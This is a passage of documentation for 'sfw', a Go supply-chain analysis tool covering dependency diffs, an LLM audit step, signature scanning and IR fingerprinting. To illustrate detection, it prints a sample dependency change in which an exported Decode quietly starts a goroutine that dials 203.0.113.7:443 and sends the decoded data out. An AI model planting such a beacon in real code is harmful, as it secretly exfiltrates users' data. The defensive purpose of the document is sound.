- **Check helpers in other packages:** a helper is found only through calls within the function's own package, or by its name.
- **Helpers that branch on a check without enforcing it:** a helper is trusted to fail when its checks fail. Moving a check into one that branches on it but always returns `nil` reads as `CheckMovedIntoHelper`, without points.
- **Calls to checking helpers dropped:** a function that stops calling a helper with another name, whose checks it relied on, is not flagged: those checks are the helper's, not the function's.
- **Functions moved to another file:** each file pair is diffed on its own, so a function that holds a check and moves to another file reads as removed (`RemovedCheck`, or 10 for the removed function).
- **Filesystem calls outside the list:** writes to an open `*os.File` (`Write`, `WriteString`) are not in the `filesystem` class; opening the file for writing is.
- **Settings through a pointer:** a field's address passed to a call (`flag.BoolVar(&cfg.InsecureSkipVerify, ...)`) records nothing; only constant stores do.
- **Package-level payloads:** a package-level `var` initializer lives in the package `init` function, so its literal is attributed to `init`, not to the function that uses it.
- **Parse failures:** in `sfw diff`, a file that fails to type-check is a fatal error. In `sfw check`, it is a per-file `error` entry.

## sfw deps diff

`sfw deps diff <old-dir> <new-dir>` compares the third-party code compiled into two trees of a module, such as a pull request's base and head. Each tree is loaded with `./...` and the [loader environment](#fingerprint-pipeline), so every module either build needs must already be in the module cache: run `go mod download` in both trees first.

A module is compared when its version or replacement differs between the trees, or when its code can change without either. That covers three cases:
- it is replaced by a local directory in both trees;
- it is a module of the tree's workspace;
- it is vendored.

A tree with `vendor/modules.txt`, or in a workspace one vendored by `go work vendor`, is loaded with `-mod=vendor`, as the go command builds it. An edit to a vendored copy is therefore compared like any other change.

A module in only one tree is `added` or `removed`. A module both trees use at the same version is still reported, as `updated`, when the new tree builds packages of it the old one did not: those are new code.

Example: `example.com/app` replaces `example.com/codec` with `../codec`. The new `codec` hides a beacon behind its existing exported `Decode` and adds a `//go:linkname` directive:

```go
// codec.go, new                                        // time.go, new file
func Decode(data []byte) string { return normalize(string(data)) }    //go:linkname nanotime runtime.nanotime
                                                                      func nanotime() int64
func normalize(s string) string {
	go report(s)
	return strings.TrimSpace(s)
}

func report(s string) {
	if c, err := net.Dial("tcp", "203.0.113.7:443"); err == nil {
		c.Write([]byte(s))
	}
}
```

`sfw deps diff --no-sandbox old/app new/app` prints this (the `init` entry, fingerprints and ops are cut):

```json
{
  "old_dir": "old/app",
  "new_dir": "new/app",
  "summary": { "modules_updated": 1, "modules_added": 0, "modules_removed": 0, "functions_changed": 3, "high_risk_changes": 3 },
  "modules": [
    {
      "path": "example.com/codec",
      "status": "updated",
      "old_version": "replace ../codec",
      "new_version": "replace ../codec",
      "packages": [
        {
          "path": "example.com/codec",
          "summary": { "total_functions": 4, "preserved": 1, "modified": 2, "added": 1, "removed": 0, "semantic_match_pct": 25, "topology_matched_pct": 75, "high_risk_changes": 1 },
          "functions": [
            { "function": "normalize", "status": "modified", "risk_score": 2,  "topology_delta": "Calls+1, AddedGoroutine" },
            { "function": "report",    "status": "added",    "risk_score": 26, "topology_delta": "Capability+network(net.Dial), Branches+1, StringLiterals~, Entropy+3.3" }
          ]
        }
      ],
      "reach": [
        { "function": "example.com/codec.Decode", "added": ["network"], "targets": ["net.Dial"], "risk_score": 20 }
      ],
      "unanalyzed": [
        { "file": "example.com/codec: //go:linkname nanotime runtime.nanotime", "kind": "linkname", "change": "added", "risk_score": 10 }
      ],
      "risk_score": 26,
      "high_risk_changes": 3
    }
  ]
}
```

For each compared module:
- **`packages`:** the changed functions of each package, with the statuses and scores of `sfw diff`, except that calls into the module's own packages are not capabilities (`golang.org/x/sys` calling its own `Syscall6` is its job), and a new goroutine is labelled without points (what it runs is covered by `reach`).
- **`reach`:** exported functions, the exported methods of exported types (promoted methods and methods of a type an exported alias names included) and package initializers that can reach a capability class they could not reach before. The walk follows static calls, closures and function values through all third-party code, and classifies standard-library functions at the call; it does not follow interface or dynamic calls, nor calls into other packages' initializers, which are entry points of their own (importing a package that was already built runs nothing new). The score is that of the most dangerous new class (see [Risk scoring](#risk-scoring)); an initializer, which runs on import, adds 10. A new exported function is not listed: its own entry in `packages` scores it.
- **`unanalyzed`:** added, modified and removed files the SSA analysis cannot see, compared by SHA-256:

  | `kind` | Files | Added or modified |
  |--------|-------|-------------------|
  | `syso`, `object` | `.syso`; `.a`, `.o`, `.so`, `.dylib`, `.dll`, `.lib` | 20 |
  | `linkname` | each `//go:linkname` or `//go:linknamestd` directive in a package's Go files, compiled or excluded, keyed by package (renaming its file is no change) | 10 |
  | `assembly`, `c` | `.s`, `.sx`; C, C++, Objective-C, Fortran and SWIG sources and headers | 5 |
  | `cgo`, `excluded-go` | Go files the build leaves out: those that import `"C"`, and those excluded by build constraints (other platforms included) | 5 |
  | `embed` | files embedded with `//go:embed` | 5 |
  | `other` | in a module with a cgo file, any other non-Go file | 5 |

  Removed files score 0. Files are taken from each built package's directory, tests excluded, and a symbolic link counts as the regular file it points to. Every file an assembly file `#include`s is included, wherever it is and whatever its name. In a module with a cgo file, every non-Go file anywhere in the module is included, since `#include` and `#cgo LDFLAGS` (`-l:payload.bin`) can reach any file under any name: one that starts like an ELF, Mach-O or PE file or an ar archive is an `object`, others are `other`. `go list` itself omits a cgo package's C files when cgo is disabled. Directives are read from the parsed comments, so one inside a block comment is not one.

A module's `risk_score` is the highest of its changes, and `high_risk_changes` counts those scoring 10 or more. An `added` module, and the packages the new tree newly builds from a module at an unchanged version, list the capability classes their entry points can reach (`capabilities`), initializers that reach any (`reach`), and their new `syso`, `object` and `linkname` files.

**Workspaces.** A tree builds with the `go.work` that governs it, as the go command does: the first `go.work` in the module's directory or a parent. The search stops at the repository's root, the first directory with a `.git` entry, so a tree checked out inside another does not take the outer tree's workspace.

The workspace's other modules are compared like local replacements, named by their path from the `go.work`. A `use` of a directory whose `go.mod` takes a dependency's path makes the go command build that directory instead of the dependency. It is reported as that dependency replaced, for example `v1.0.0 -> use ./shadow`, with the directory's function diffs.

Limits:
- **cgo:** the loader disables cgo. A dependency package with no Go files left without cgo fails to load, and `sfw deps diff` exits 1. C code is hashed, not analyzed.
- **Load errors are fatal:** any package error in either tree (a missing module, a type error) fails the command, rather than producing a partial diff.
- **Sandbox mounts:** under the sandbox, the following are visible, and nothing else:
  - the trees;
  - their module and `.git` roots;
  - the directory of the `go.work` that governs them;
  - the module cache.

  A local `replace` or a `use` directory outside these does not load. Use `--no-sandbox` for such a tree.

## sfw audit

```bash
export ANTHROPIC_API_KEY=...
sfw audit old.go new.go "minor refactor of logging"
```

1. Runs `sfw diff` on the two files.
2. Collects every function with `risk_score >= 10`: its name, status, score, `topology_delta`, at most 10 `added_ops`, and its source on both sides (`old_source`, `new_source`: the declaration with line numbers, the first 120 lines of a longer one). The source comes from `go/parser` over the two files, outside the sandbox, which reads text and runs nothing. Each `unanalyzed` entry with `risk_score >= 10` is collected too, as its `file` string, change, score and `kind`, with no source.
3. If there are none, returns `MATCH` without calling an LLM, so no key is needed.
4. Otherwise it makes two LLM calls with the requested model:
   - a prompt-injection sentinel over the payload, where an unsafe result gives `LIE`;
   - the verdict call.

   A reply that fails validation becomes `SUSPICIOUS`.
5. With a Claude model the verdict call may read further through six read-only tools served from the two files and the diff: `function_source` (a whole declaration; a closure name gives its enclosing declaration), `function_diff` (every added and removed operation and the topology match), `file_context` (lines around a line, radius at most 60), `list_functions`, `callers` and `callees` (syntactic, within the file). Each round of tool results passes the sentinel before the model sees it, an unsafe result gives `LIE`, and results go back inside nonce fences as untrusted data. A tool result is cut at 16 KB; after 8 rounds without a verdict the audit is `ERROR`. Other providers judge the payload alone.

| Model prefix | Provider | Key variable |
|--------------|----------|--------------|
| `claude` (default `claude-opus-5-5`) | Anthropic Messages API via `anthropic-sdk-go` (structured JSON output) | `ANTHROPIC_API_KEY`, or the SDK's credential chain (`ANTHROPIC_AUTH_TOKEN`, an `ant auth login` profile, workload identity federation) |
| `gemini` | Gemini API | `GEMINI_API_KEY` |
| anything else | OpenAI Responses API | `OPENAI_API_KEY` |

`--api-key` overrides the variable and prints a warning, because the key ends up in shell history. If high-risk changes exist but no credential is available, the verdict is `ERROR`, exit 1. Output with no high-risk changes:

```json
{
  "inputs": { "commit_message": "no-op" },
  "risk_filter": { "high_risk_detected": false, "evidence_count": 0 },
  "output": { "verdict": "MATCH", "evidence": "Automatic Pass: No structural escalation detected." }
}
```

## sfw index and sfw scan

```bash
sfw index --name Demo --severity HIGH --db signatures.db new.go
sfw scan --db signatures.db ./src
sfw scan --deps --deps-depth transitive --db signatures.db ./cmd/app
```

### index

`sfw index` stores one signature per function, closures included. Each signature is named `<name>_<function>` and gets the ID `SFW-<CAT>-<unix time>-<n>`, where `<CAT>` is the first three letters of the category, upper-cased. The first entry from indexing `new.go`:

```json
{
  "id": "SFW-MAL-1791890855-1",
  "name": "Demo_Handle",
  "description": "Function Handle from new.go",
  "severity": "HIGH",
  "category": "malware",
  "topology_hash": "5b54a1f738fa6b2719f95554f03621c9",
  "fuzzy_hash": "B0L0BR0P1R0",
  "entropy_score": 1.584962500721156,
  "entropy_tolerance": 0.5,
  "node_count": 1,
  "loop_depth": 0,
  "identifying_features": {
    "required_calls": ["go:closure:func()", "net.Dial"],
    "string_patterns": ["tcp"],
    "control_flow": {}
  },
  "metadata": { "author": "sfw-index", "created": "2026-10-13" }
}
```

How each field is derived (`detection.IndexFunction`):

| Field | Source |
|-------|--------|
| `topology_hash` | `GenerateTopologyHash`, the first 16 bytes of SHA-256 (32 hex chars) over `P<params>R<results>B<blocks>I<instrs>L<loops>BR<branches>`, then each `CallSignatures` entry as `<len>:<name>:<count>`, sorted and joined by `;`, then `D`/`G`/`S`/`P` for defer/go/select/panic. Because instruction count and callee names are hashed, a one-instruction change or a renamed callee changes the hash. The function's own name and variable names are not hashed. |
| `fuzzy_hash` | `GenerateFuzzyHash`, see [Fuzzy hash](#fuzzy-hash) |
| `node_count` | `BlockCount` |
| `loop_depth` | `LoopCount` (the number of loops, not nesting depth) |
| `required_calls` | every `CallSignatures` key, sorted |
| `string_patterns` | every string literal of 3 or more characters |
| `control_flow.has_infinite_loop` | `HasInfiniteLoop`: a `for` statement without a condition (`for { ... }`) in the function's own body |
| `control_flow.has_reconnect_logic` | some call contains `net.Dial`, some call contains `time.Sleep`, and `LoopCount > 0` |

`optional_calls` and `control_flow` are stored but not read by matching.

### scan

For each function in the target, the PebbleDB backend (`PebbleScanner.ScanTopology`) does the following:

1. Collects candidates from two prefix scans, de-duplicated by ID:
   - `topo:<TopologyHash>:`, the exact topology bucket;
   - `fuzzy:<FuzzyHash>:`, the fuzzy bucket. Only the exact bucket is searched; neighbouring buckets are not.
2. Rejects a candidate whose entropy distance exceeds its tolerance, using the entropy packed into the index value, before loading the signature.
3. Loads the `sig:` record from the same snapshot and scores it with `detection.MatchSignature`.
4. Keeps the matches with confidence ≥ threshold (default 0.75), sorted by confidence.

`--exact` (`ScanTopologyExact`) uses only the `topo:` bucket and returns the single best match. On the JSON backend, `ScanTopology` scores every signature without index or entropy pre-filtering. With a JSON database, `--exact` sets the threshold to 1.0.

`MatchSignature` confidence is the plain mean of these parts:

| Part | Value | Included |
|------|-------|----------|
| topology | 1.0 if the topology hashes are equal. Otherwise the mean of the block-count ratio and the loop-count ratio (each min/max), or 0.5 if the signature has neither. | always |
| entropy | 1 − distance / tolerance within tolerance, else 0.5 | always |
| calls | matched / required, where a required call matches if any call signature contains it as a substring | signature has `required_calls` |
| strings | matched / total, case-insensitive substring | signature has `string_patterns` and the part is > 0 |

Two adjustments follow:
- **Veto:** a missing required call sets confidence to 0, but only if the function's indirect-call ratio is below 0.5 and its obfuscation class is NONE or LOW.
- **Obfuscation floor:** after averaging, a confidence of at least 0.4 is raised to at least 0.5 × the obfuscation score.

Scanning `new.go` against the database built from it gives 3 alerts at confidence 1, and exit code 0. The first alert:

```json
{
  "signature_id": "SFW-MAL-1791890855-1",
  "signature_name": "Demo_Handle",
  "severity": "HIGH",
  "matched_function": "Handle",
  "confidence": 1,
  "match_details": {
    "topology_match": true,
    "entropy_match": true,
    "calls_matched": ["go:closure:func()", "net.Dial"],
    "calls_missing": null,
    "strings_matched": ["tcp"],
    "topology_similarity": 1,
    "entropy_distance": 0,
    "obfuscation_class": "NONE"
  }
}
```

The scan output's top-level fields are:
- `target`, `database`, `backend`, `threshold`, `total_functions_scanned`
- `alerts`
- `summary` (`critical`, `high`, `medium`, `low`, `total_alerts`)
- `dependencies_scanned` and `scanned_dependencies`, only with `--deps`.

### Dependency scanning

`--deps` scans third-party packages in addition to the target. Standard-library packages are excluded.

| `--deps-depth` | Packages scanned |
|----------------|------------------|
| `direct` | packages imported by any package of the target's own module |
| `transitive` | also everything those packages import |

Packages are loaded with `GOPROXY=off` and `-mod=readonly`, so modules must already be in the module cache (`go mod download`), unless the tree has a vendor directory the go command would build from (see [Files](#files)), which is loaded with `-mod=vendor`. `dependencies_scanned` counts dependency functions, which are also included in `total_functions_scanned`.

## Signature store

A `--db` path ending in `.json` selects the JSON backend for `check --scan`, `index`, `scan` and `stats`. Any other path selects PebbleDB.

### Database path resolution

`check --scan`, `index`, `scan` and `stats` use the first of:

1. `--db`
2. `$SFW_DB_PATH`, used without checking that it exists
3. `./signatures.db`, `~/.sfw/signatures.db`, `/usr/local/share/sfw/signatures.db`, `/var/lib/sfw/signatures.db`, the first that exists
4. `./signatures.db`

`check`, `scan` and `stats` do not create a database; `index` and `migrate` do.

### PebbleDB layout

`github.com/cockroachdb/pebble` (an LSM-tree key-value store), one directory, flat key space:

| Key | Value |
|-----|-------|
| `sig:<ID>` | gob-encoded `detection.Signature`. A value starting with `{` is decoded as legacy JSON. |
| `topo:<TopologyHash>:<ID>` | `0x01`, entropy (float64 LE), tolerance (float64 LE), then the ID; 17 + len(ID) bytes |
| `fuzzy:<FuzzyHash>:<ID>` | same packed value; written only when the fuzzy hash is non-empty |
| `entr:<entropy>:<ID>` | ID |
| `meta:schema_version` | `"4"` |

```
entr:005.8200:SFW-MAL-001
     ├──────┤ ├─────────┤
     %08.4f   signature ID
```

The fixed-width `%08.4f` entropy sorts lexicographically in numeric order. The `entr:` index is read only by `ScanByEntropyRange`; the scan path does not use it.

Lookups are prefix seeks, cost O(log N + k) in the LSM tree. `NewPebbleScanner` refuses a database whose `meta:schema_version` is not 4 (`CurrentSchemaVersion`).

Write guarantees:
- `AddSignature`, `AddSignatures` and `DeleteSignature` each commit a single batch with `pebble.Sync`.
- `RebuildIndexes` and `MigrateFromJSON` commit in several batches, so they can stop partway.

Concurrency:
- Scans read from a snapshot.
- Pebble locks the directory, so a second process cannot open the database, even with `ReadOnly: true`.

Every database write goes through `pkg/storage/pathguard`: PebbleDB writable opens, JSON backend saves and `ExportToJSON`. It refuses a path inside a system directory, checking both the path as written and the path after resolving symlinks in its longest existing prefix. A file that does not exist yet therefore cannot reach a system directory through a symlinked parent. The protected directories are:

- **Unix-like systems:** `/etc`, `/usr` (except `/usr/local`), `/bin`, `/sbin`, `/boot`, `/lib`, `/lib32`, `/lib64`, `/proc`, `/sys` and `/dev`.
- **macOS:** the same list plus `/private/etc` and `/System`.
- **Windows:** `%SystemRoot%`.

Read-only opens are not checked.

### stats and migrate

```bash
sfw stats --db signatures.db
```

```json
{
  "database": "signatures.db",
  "backend": "pebbledb",
  "signature_count": 3,
  "topology_index_count": 3,
  "entropy_index_count": 3,
  "file_size_bytes": 4187,
  "file_size_human": "4.1 KB"
}
```

`stats` counts every key under each index prefix, so its cost is linear in the number of signatures.

`sfw migrate --from signatures.json --to signatures.db` streams the JSON file's `signatures` array into PebbleDB in batches of 1000. `PebbleScanner.ExportToJSON` writes the JSON backend's own format (`version`, `description`, `signatures`), so its output can be opened with `--db <file>.json` or imported with `migrate`.

### API

```go
scanner, err := pebbledb.NewPebbleScanner("signatures.db", pebbledb.DefaultPebbleScannerOptions())
```

`DefaultPebbleScannerOptions()` returns `MatchThreshold: 0.75`, `EntropyTolerance: 0.5`, `ReadOnly: false` and `CacheSize: 8 << 20`. A zero field is replaced by its default.

| Method | Behavior |
|--------|----------|
| `AddSignature(*detection.Signature)` | Requires `TopologyHash`. An empty ID becomes `SFW-AUTO-<16 hex>`. |
| `AddSignatures([]*detection.Signature)` | One batch; for duplicate IDs, the last one wins. |
| `GetSignature(id)` | Looks up one signature by ID. |
| `GetSignatureByTopology(hash)` | Returns the first signature with that hash. |
| `ListSignatureIDs()`, `CountSignatures()` | Scan the whole `sig:` prefix. |
| `DeleteSignature(id)` | Removes the signature and its index entries in one batch. |
| `MarkFalsePositive(id, note)` | Appends `FP:<RFC3339 time>:<note>` to `Metadata.References`. Matching does not read it. |
| `RebuildIndexes()` | Rebuilds the `topo:`, `fuzzy:` and `entr:` entries from `sig:` records. It does not recompute hashes. |
| `Compact()` | Full-range compaction. Fails on a read-only database. |
| `ScanTopology(topo, name)` | Runs both prefix scans and returns `[]detection.ScanResult`. |
| `ScanTopologyExact(topo, name)` | Searches the `topo:` bucket only and returns `*detection.ScanResult`. |

## Fingerprint pipeline

```
┌────────────────────────────────────────────────────────────────┐
│ golang.org/x/tools/go/packages.Load, then go/ssa build         │
│ loader env: CGO_ENABLED=0 GOPROXY=off GOTOOLCHAIN=local        │
│             GOFLAGS=-mod=readonly (-mod=vendor if vendored)    │
│             GONOSUMDB=*                                        │
│             GOWORK=<the governing go.work, or off>             │
└────────────────────────────────┬───────────────────────────────┘
                                 │ *ssa.Function
┌────────────────────────────────┴───────────────────────────────┐
│ branch normalization (virtual, pkg/diff)                       │
│ a >= b  ->  a < b    successors swapped                        │
│ a >  b  ->  a <= b   successors swapped                        │
│ integer and string operands only; If must be the sole user     │
└────────────────────────────────┬───────────────────────────────┘
                                 │ *ssa.Function + virtual branch table
┌────────────────────────────────┴───────────────────────────────┐
│ canonicalizer (pkg/analysis/ir)                                │
│ 1. name parameters p0..pN, free variables fv0..fvN             │
│ 2. loop.DetectLoops: back-edge b->h where h dominates b        │
│ 3. loop.AnalyzeSCEV: Tarjan SCC over each loop body            │
│ 4. hoist loop-invariant builtin calls to the preheader         │
│ 5. rewrite basic IVs as {start, +, step}<bH:type>              │
│ 6. preorder DFS over blocks; emit IR, v0..vN on first use      │
└────────────────────────────────┬───────────────────────────────┘
                                 │ canonical IR (text)
┌────────────────────────────────┴───────────────────────────────┐
│ SHA-256 of the canonical IR text  ->  64-hex fingerprint       │
└────────────────────────────────────────────────────────────────┘
```

### Loading

`sfw diff`, single and batch, loads source with `pkg/diff/loader.go`. It asks `go/packages` for metadata only (`go list`, with the environment above) and type-checks the packages itself:
- a batch's files are listed with one `go list` run over their directories. `go/packages` runs one per file; it builds the same packages for each file, and picks the same ones for a file outside any listed package;
- the packages being diffed are parsed with comments and fully type-checked, with the same `types.Config` as `go/packages`;
- their dependencies are parsed with function bodies removed (`PurgeFuncBodies`, copied from x/tools' gopls and fixed to keep the elements of a `[...]T{...}` literal whose element type spans several lines, as their count is part of the type), without comments or object resolution, and type-checked without bodies;
- a dependency's imports that no declaration names, which only its function bodies use, are not loaded at all. A dependency is parsed as soon as a load needs it, and its parse decides which of its imports are needed. This skips about 45% of the dependency packages; gin's diffs get about 19% faster;
- the diffed packages' files are parsed as soon as `go list` returns, while type-checking waits for each package's imports;
- standard-library packages, and module-cache packages not replaced by a local directory, are type-checked once per process and shared by both trees and all batch groups. The cache key covers the package path and name, type sizes, Go version, file paths and the keys of its imports;
- only the diffed files' functions are fingerprinted.

#### Type cache

Those shared dependencies can also be kept between runs, in a cache that `sfw` alone writes. An entry's key covers:
- the running `sfw` executable's contents;
- the package path and name, type sizes, Go version and `GODEBUG`;
- the SHA-256 of every source file;
- the keys of its imports.

A hit therefore means the same source bytes checked by the same program. Even under the same module version, an edited file misses.

- **Which packages are stored:** only those without errors and without an ill-typed import. An entry also records which imports its package's declarations need, so a warm run skips the others without parsing.
- **Damaged entries:** an entry failing its checksum, or decoding to anything but its own package against the packages it imports, is recomputed.
- **Location:** `sfw/types` in the user cache directory, private to the user. Entries unused for a week are removed.
- **Speed:** a warm cache makes the pocketbase diff above about 30% faster.

`SFW_TYPE_CACHE` decides when the cache is used:

| Value | Cache |
|---|---|
| `on` | on |
| `off` | off |
| `rw:DIR` | reads and writes `DIR` |
| `ro:DIR` | only reads `DIR` |
| unset | on only when stderr is a terminal and `CI` is unset |

The cache is off by default in automation for a reason: a pull request's code may have run earlier under the same account. In CI, a batch already checks each dependency once, so there is little to gain.

A worker in the gVisor sandbox sees the cache read-only. Entries come from runs outside a sandbox: `--no-sandbox`, or a host without `runsc`. Code running in the sandbox can leave nothing behind for a later analysis to trust.

The only output differences from `go/packages` concern errors in a dependency's function bodies and composite literals (`{...}` values other than `[...]T` arrays), which are removed before parsing. A type error inside one is not reported, nor is an error in a package that only they import. Conversely, `len` or `cap` of a sized array literal in a dependency's declarations is constant once the literal's elements are gone, so an element that makes it non-constant (a call, as in `1 << len([8]int{f()})`) can turn it into a constant overflow or bounds error that fails the load. `pkg/diff` tests compare the two loaders' functions, fingerprints and full topologies on fixtures for modules, tests, overlays, type errors, cgo, build tags, replacements, vendoring, cross-package generics and Go versions, and, with `SFW_PARITY_CORPUS` set, on a corpus of cloned projects. `SFW_LOADER=packages` selects `go/packages`. A module with an import cycle falls back to it. `sfw check`, `scan` and `deps diff` use `go/packages`.

A function with more than 5000 blocks (`MaxFunctionBlocks`) is not canonicalized. Its fingerprint is a SHA-256 over the raw SSA, which is sensitive to renames.

### Example

These two functions produce byte-identical canonical IR, so they share the fingerprint `ab2661f278a489833655492de6dd79dafbf333cac95a215baddc7af6c127e22c`:

```
func Sum(xs []int) int {              func Sum(xs []int) int {
    s := 0                                s := 0
    for i := 0; i < len(xs); i++ {        for _, x := range xs {
        s += xs[i] * 4                        s += x * 4
    }                                     }
    return s                              return s
}                                     }
```

```
func(p0: []int) -> (int)
b0:
  v0 = Call <builtin:len>(p0)
  Jump b1
b1:
  ; LoopHeader
  v2 = Phi [b0: const(0)] [b2: v1]
  v3 = BinOp <, {0, +, 1}<b1:int>, v0
  If v3, b2, b3
b2:
  v4 = IndexAddr p0, {0, +, 1}<b1:int>
  v5 = UnOp *, v4
  v6 = BinOp *, const(4), v5
  v1 = BinOp +, v2, v6
  Jump b1
b3:
  Return v2
```

- **Hoisting:** `len(xs)` was moved from the loop header to `b0`.
- **Loop counter:** in both forms it is replaced by the recurrence `{0, +, 1}<b1:int>`, which reads "starts at 0, steps by +1, in the loop headed by `b1`, type `int`".
- **Range loop:** SSA starts its counter at -1 and increments before use. The incremented value folds to the same recurrence.
- **Fingerprint:** it is the SHA-256 of this text, including the trailing newline. `diff.FingerprintResult.CanonicalIR` holds the text.

### Scalar evolution (`pkg/analysis/loop`)

- **Loops:** `DetectLoops` finds back-edges b→h where h dominates b. Back-edges that share a header are merged into one loop. Results are memoized in a per-loop `SCEVCache`, and recursion depth is capped at 100 (`MaxSCEVDepth`).
- **Induction variables (IVs):**
  - Tarjan's SCC algorithm runs over the def-use graph of the loop body.
  - A header φ in a cycle φ → BinOp → φ with a loop-invariant step is an IV.
  - Add/sub gives a basic IV, `{start, +, step}`; mul gives a geometric IV.
  - IVs must be integers. Only basic IVs are rewritten in the IR; a geometric IV stays a plain φ.
  - With several preheader edges, all start values must agree.
- **Recurrence algebra:**
  - `{S,+,T} + C` → `{S+C,+,T}`
  - `C × {S,+,T}` → `{C·S,+,C·T}`
  - `{S₁,+,T₁} + {S₂,+,T₂}` → `{S₁+S₂,+,T₁+T₂}`
  - subtraction likewise.
  - C must be loop-invariant; the product of two recurrences is left opaque.
  - Expressions derived from an IV render as recurrences, e.g. `i*4` → `{0, +, 4}<b1:int>`.
- **Trip count:** `max(0, ⌈(limit − start) / step⌉)`, computed as `(limit − start + step − 1) / step`.
  - Requirements: a single exiting block, a comparison on the IV φ itself, and a loop-invariant limit.
  - Handled forms: up-counting and down-counting, inclusive bounds (`<=`, `>=`), `!=` with step ±1, and the IV on either side of the comparison. A down-counting loop uses the absolute step. An up-counting loop with step ≤ 0 is Unknown.

### Canonical IR rules (`pkg/analysis/ir`)

- **Names:**
  - parameters are `p0..pN` and free variables `fv0..fvN`;
  - values are `v0..vN`, numbered by first reference during emission, so an operand can be named before the line that defines it;
  - blocks are `b0..bN` in preorder DFS, true successor first. Unreachable blocks are appended in index order.
- **Commutative operands** are sorted.
- **Hoisting:** only `len`, `cap`, `complex`, `real`, `imag`, `min` and `max`. Their arguments must be loop-invariant, `len`/`cap` must not be on a map or channel, and the loop must have a single preheader. The hoist is virtual: the SSA is not mutated.
- **Callees** are written with their import path, method receiver and signature: `<func_ref:net.Dial:func(string, string) (net.Conn, error)>`. Types in the function's own package are unqualified, e.g. `<func_ref:(T).M:func()>`.
- **Literals** pass through `ir.LiteralPolicy`.
  - `DefaultLiteralPolicy` masks every string (as `<string_literal>`), every integer outside [-16, 16] and every float. It keeps small integers and booleans.
  - `KeepAllLiteralsPolicy` keeps everything.
  - Loop start values, steps and trip counts bypass the policy, so `i < 100` and `i < 200` fingerprint differently under both policies.
- **Escaping:** a kept string is emitted as an escaped `const("...")` (`"x\ny"` stays on one line), and struct tags are quoted, so literal content cannot inject IR lines.
- **Fields** are named, not indexed: `FieldAddr p0, field(IsAdmin)`. Reordering or inserting a struct's fields does not change a function that reads them, but reading a different field does.
- **Type parameters** are written by position: `$0`, `$1`, ... The receiver's and the function's type parameters are numbered together; in a closure, the enclosing function's come first. This covers value types and the receivers and type arguments of callees, e.g. `<func_ref:(*List[$0]).Push:func($0)>`. Renaming a type parameter keeps the fingerprint; reordering type parameters changes it.
- **Generic instances** are written with aliases resolved (`any` as `interface{}`), `byte` as `uint8` and `rune` as `int32`: `<func_ref:slices.Contains[[]uint8, uint8]:func([]uint8, uint8) (bool)>`. SSA builds one instance for every call site with identical type arguments and spells it as the first caller it builds for, so the spelling would otherwise depend on the other code loaded with the function. The function's own types keep their spelling.

## Semantic Zipper

`pkg/diff/zipper.go` aligns the SSA of two versions of one function and reports the unaligned instructions as `added_ops` and `removed_ops`.

1. **Setup:**
   - run SCEV on both functions and build a canonicalizer for each;
   - map parameters, and separately free variables, that share a name and type. Then map the rest in order wherever the types agree;
   - a parameter left without a partner leaves its uses unmapped, so a changed signature still reports the body's changes.
2. **Entry seed:** take a longest common subsequence over at most 100 instructions of the two entry blocks.
3. **Propagation:** breadth-first over def-use edges. For each mapped pair (old, new), each user of old is compared with the users of new in the same bucket, and the first equivalent one is mapped.
   - The bucket key is the instruction's Go type plus a kind-specific suffix, e.g. `*ssa.BinOp:+`.
   - Buckets are capped at 100 candidates (`MaxCandidates`); extra candidates are dropped.
4. **Terminators:** the last instruction of every block is matched by operand equivalence.
5. **Control flow:** blocks are paired one-to-one. The entry blocks are paired first. The others are paired greedily by the number of mapped instructions they share, with ties broken by block index. A mapped pair is reported in both lists, and excluded from `matched_nodes`, if either:
   - its two instructions sit in blocks that are not paired with each other; or
   - it is an `If` or `Jump` where an old successor is paired with a block other than the new successor in the same position.
6. **Result:** unmapped instructions are `added` or `removed`. Instructions replaced by an IV rewrite are omitted.

Two instructions are equivalent when all of the following hold:
- **Same instruction type:** they have the same `reflect` type.
- **Same value type:** the types are identical by `types.Identical`. If that check fails, the comparison falls back to type strings, with each side's own package unqualified and type parameters written by position.
- **Same operator properties:** e.g. the `BinOp` operator, the field name, `Alloc.Heap`.
- **Equivalent operands:** each operand pair is already mapped or has an equal canonical string. φ edges only need matching types. The check is not recursive. Commutative operand swaps are allowed for `+`, `*`, `&`, `|` and `^` on numeric types, and for `==` and `!=` on any type.

## Function topology

`topology.ExtractTopology(fn)` returns a `*FunctionTopology`. Its fields:

| Field | Content |
|-------|---------|
| `ParamCount`, `ReturnCount` | signature arity; the receiver counts as a parameter |
| `ParamTypes`, `ReturnTypes` | type strings |
| `BlockCount`, `InstrCount`, `PhiCount` | SSA counts |
| `LoopCount` | max(SSA natural loops, AST `for`/`range` statements) |
| `BranchCount` | SSA `If` instructions, loop conditions included |
| `CyclomaticComplexity` | cyclomatic complexity |
| `CallSignatures` | call profile by package name (table below) |
| `CallTargets` | concrete callees by import path |
| `Capabilities` | call target → capability class |
| `Checks` | verification calls and check helpers (see [Deletion signals](#deletion-signals)) |
| `CapabilityGuards` | capability call target → fewest conditional branches any of its call sites depends on |
| `WeakSettings`, `SecureSettings` | security settings the function writes (see [Deletion signals](#deletion-signals)) |
| `ErrorExits` | two-way branches with exactly one side ending the function with a failure |
| `BinOpCounts`, `UnOpCounts`, `InstrCounts` | operator and instruction-type histograms |
| `HasDefer`, `HasPanic`, `HasGo`, `HasSelect` | control-flow flags |
| `HasRange` | true only for `range` over a map or string |
| `HasInfiniteLoop` | a `for` statement without a condition in the function's own body (closures excluded) |
| `HasRecover` | true only when the function itself defers and calls `recover` directly |
| `StringLiterals` | see [Entropy](#entropy) |
| `EntropyScore`, `EntropyProfile` | see [Entropy](#entropy) |
| `Obfuscation` | see [Obfuscation profile](#obfuscation-profile) |
| `FuzzyHash` | see [Fuzzy hash](#fuzzy-hash) |

### Call signatures

| Call | `CallSignatures` key | Example |
|------|----------------------|---------|
| Static function | `<package name>.<func>` | `net.Dial`, `exec.Command` |
| Concrete method | `<package name>.<method>` (receiver dropped) | `bytes.WriteString`, `http.Do` |
| Generic instance | `<import path>.<func>[<type args>]`, `(<receiver>).<method>`; aliases resolved (`any` as `interface{}`), `byte` as `uint8`, `rune` as `int32` | `slices.Contains[[]uint8, uint8]`, `(*sync/atomic.Pointer[int]).Load` |
| Interface method | `invoke:<pkg>.<Iface>.<method>` | `invoke:net.Conn.Write` |
| Builtin | `builtin:<name>` | `builtin:len` |
| Closure or method value | `closure:<signature>` | `closure:func(a int) int` |
| Function value | `dynamic:<signature>` | `dynamic:func(int) error` |
| `go` statement | `go:<target>` | `go:closure:func()` |
| `defer` statement | `defer:<target>` | `defer:invoke:net.Conn.Close` |
